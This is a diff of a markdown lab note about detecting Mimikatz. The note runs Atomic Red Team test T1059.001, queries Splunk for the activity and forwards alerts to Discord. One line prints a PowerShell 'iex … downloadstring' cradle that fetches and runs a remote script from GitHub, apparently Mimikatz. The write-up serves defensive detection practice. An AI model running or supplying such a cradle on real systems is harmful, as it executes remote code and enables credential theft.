@@ -41,7 +41,7 @@ PS C:\AtomicREdTeam\atomics> Invoke-AtomicTest T1059.001 -TestNumbers 1
 
 
 
-
+__
 
 ### Step 2 – Detect  Mimikatz in Splunk
 
@@ -57,8 +57,7 @@ table _time, host, user, parent_process_name, process_name, CommandLine
 [[Mimikatz - Splunk Query.png]]
 
 
-
-
+__
 
 ### Step 3– Write Detection/Connect to Discord Alerts
 
@@ -81,13 +80,13 @@ powershell.exe "iex (new-object net.webclient).downloadstring('https://raw.githu
 [[Mimikatz - Detection.png]]
 
 
+__
 
+Send alert to Discord Server using a script.
 
-
-
-Webhook to DIscord -
+### Webhook to Discord -
 [[Mimikatz - actualshown -detection.png]]
-[[Mimikatz - Alert - Trigger.png]]
+[[T1059.001.png]]
 
 
 
